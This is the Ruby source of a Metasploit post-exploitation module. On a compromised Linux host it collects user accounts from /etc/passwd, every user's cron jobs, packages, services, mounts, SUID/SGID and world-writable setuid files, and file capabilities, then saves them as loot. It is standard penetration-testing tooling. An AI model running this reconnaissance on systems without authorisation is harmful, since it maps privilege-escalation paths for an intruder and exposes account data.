##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Gather System and User Information',
      'Description'   => %q{
        This module gathers system information. We collect
        installed packages, installed services, mount information,
        user list, user bash history and cron jobs
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Carlos Perez <carlos_perez[at]darkoperator.com>', # get_packages and get_services
          'Stephen Haywood <averagesecurityguy[at]gmail.com>', # get_cron and original enum_linux
          'sinn3r', # Testing and modification of original enum_linux
          'ohdae <bindshell[at]live.com>', # Combined separate mods, modifications and testing
          'Roberto Espreto <robertoespreto[at]gmail.com>', # log files and setuid/setgid
          'Henry Hoggard', # Fix setuid/setgid, add printing, fixed bugs
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    distro = get_sysinfo
    store_loot(
      "linux.version",
      "text/plain",
      session,
      "Distro: #{distro[:distro]},Version: #{distro[:version]}, Kernel: #{distro[:kernel]}",
      "linux_info.txt",
      "Linux Version")

    # Print the info
    print_good("Info:")
    print_good("\t#{distro[:version]}")
    print_good("\t#{distro[:kernel]}")

    users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
    vprint_good("User accounts:")
    vprint_good("\n#{users}\n")
    user = execute("/usr/bin/whoami")
    installed_pkg = get_packages(distro[:distro])
    vprint_good("Installed Packages:")
    vprint_good("\n#{installed_pkg}\n")
    installed_svc = get_services(distro[:distro])
    vprint_good("Running Services:")
    vprint_good("\n#{installed_svc}\n")
    mount = execute("/bin/mount -l")
    crons = get_crons(users, user)
    vprint_good("Cronjobs:")
    vprint_good("\n#{crons}\n")
    diskspace = execute("/bin/df -ahT")
    disks = (mount + "\n\n" + diskspace)
    vprint_good("Disk Info:")
    vprint_good("\n#{disks}\n")
    logfiles = execute("find /var/log -type f -perm -4 2> /dev/null")
    vprint_good("Log Files:")
    vprint_good("\n#{logfiles}\n")
    uidgid = get_suid_files()
    capabilities = get_capabilities()
    save("Linux version", distro)
    save("User accounts", users)
    save("Installed Packages", installed_pkg)
    save("Running Services", installed_svc)
    save("Cron jobs", crons)
    save("Disk info", disks)
    save("Logfiles", logfiles)
    save("Setuid/setgid files", uidgid)
    save("Capabilities", capabilities)

  end

  def save(msg, data, ctype = 'text/plain')
    unless data.empty?
      ltype = "linux.enum.system"
      loot = store_loot(ltype, ctype, session, data, nil, msg)
      print_status("#{msg} stored in #{loot}")
    end
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end

  def get_packages(distro)
    packages_installed = ""
    case distro
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      packages_installed = execute("rpm -qa")
    when /slackware/
      packages_installed = execute("/bin/ls /var/log/packages")
    when /ubuntu|debian/
      packages_installed = execute("/usr/bin/dpkg -l")
    when /gentoo/
      packages_installed = execute("equery list")
    when /arch/
      packages_installed = execute("/usr/bin/pacman -Q")
    else
      vprint_error("Could not determine package manager to get list of installed packages")
    end
    packages_installed
  end

  def get_services(distro)
    services_installed = ""
    case distro
    when /fedora|redhat|suse|mandrake|oracle|amazon/
      services_installed = execute("/sbin/chkconfig --list")
    when /slackware/
      services_installed << "\nEnabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'*$\'")
      services_installed << "\n\nDisabled:\n*************************\n"
      services_installed << execute("ls -F /etc/rc.d | /bin/grep \'[a-z0-9A-z]$\'")
    when /ubuntu|debian/
      services_installed = execute("/usr/sbin/service --status-all")
    when /gentoo/
      services_installed = execute("/bin/rc-status --all")
    when /arch/
      services_installed = execute("/bin/egrep '^DAEMONS' /etc/rc.conf")
    else
      vprint_error("Could not determine the Linux Distribution to get list of configured services")
    end
    services_installed
  end

  def get_crons(users, user)
    cron_data = ""
    if user == "root" && users
      users = users.chomp.split
      users.each do |u|
        if u == "root"
          vprint_status("Enumerating as root")
          cron_data = ""
          users.each do |usr|
            cron = execute("crontab -u #{usr} -l 2>/dev/null")
            unless cron.empty?
              cron_data << "*****Listing cron jobs for #{usr}*****\n"
              cron_data << cron + "\n\n"
            end
          end
        end
      end
    else
      vprint_status("Enumerating as #{user}")
      cron_data = "***** Listing cron jobs for #{user} *****\n\n"
      cron_data << execute("crontab -l")

    end
    cron_data
  end

  def get_suid_files()
    suid_data = ""
    suid = execute("find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;")
    if suid.empty?
      vprint_error("Could not find any SUID files")
    else
      suid_data << "*****Setuid files*****"
      suid_data << suid
      vprint_good("Setuid files:")
      vprint_good("\n#{suid}\n")
    end
    sgid = execute("find / -perm -2000 -type f -exec ls -la {} 2>/dev/null \;")
    if sgid.empty?
      vprint_error("Could not find any SGID files")
    else
      suid_data << "*****Setgid files*****"
      suid_data << sgid
      vprint_good("Setgid files:")
      vprint_good("\n#{sgid}\n")
    end
    wwsuid = execute("find / -perm -4002 -type f -exec ls -la {} 2>/dev/null \;")
    if wwsuid.empty?
      vprint_error("Could not find any world writable SUID files")
    else
      suid_data << "*****World writable SUID files*****"
      suid_data << wwsuid
      vprint_good("World writable SUID files:")
      vprint_good("\n#{wwsuid}\n")
    end
    wwsuidrt = execute("find / -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;")
    if wwsuidrt.empty?
      vprint_error("Could not find any world writable SUID files owned by root")
    else
      suid_data << "*****World writable SUID files owned by root*****"
      suid_data << wwsuidrt
      vprint_good("World writable SUID files owned by root:")
      vprint_good("\n#{wwsuidrt}\n")
    end
    wwsgid = execute("find / -perm -2002 -type f -exec ls -la {} 2>/dev/null \;")
    if wwsgid.empty?
      vprint_error("Could not find any world writable SGID files")
    else
      suid_data << "*****World writable SGID files*****"
      suid_data << wwsgid
      vprint_good("World writable SGID files")
      vprint_good("\n#{wwsgid}\n")
    end
    wwsgidrt = execute("find / -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;")
    if wwsgidrt.empty?
      vprint_error("Could not find any world writable SGID files owned by root")
    else
      suid_data << "*****World writable SGID files owned by root*****"
      suid_data << wwsgidrt
      vprint_good("World writable SGID files owned by root:")
      vprint_good("\n#{wwsgidrt}\n")
    end
    suid_data
  end

  def get_capabilities()
    capabilities = ""
    filecaps = execute("getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null")
    if filecaps.empty?
      vprint_error("Could not find any files with POSIX capabilities")
    else
      capabilities << "*****Files with POSIX capabilities*****"
      capabilities << filecaps
      vprint_good("Files with POSIX capabilities:")
      vprint_good("\n#{filecaps}\n")
    end
    usercaps = execute("grep -v '^#\|none\|^$' /etc/security/capability.conf 2>/dev/null")
    if usercaps.empty?
      vprint_error("Could not find any user capabilities")
    else
      capabilities << "*****User capabilities*****"
      capabilities << usercaps
      vprint_good("User capabilities:")
      vprint_good("\n#{usercaps}\n")
    end
    capabilities
  end
end
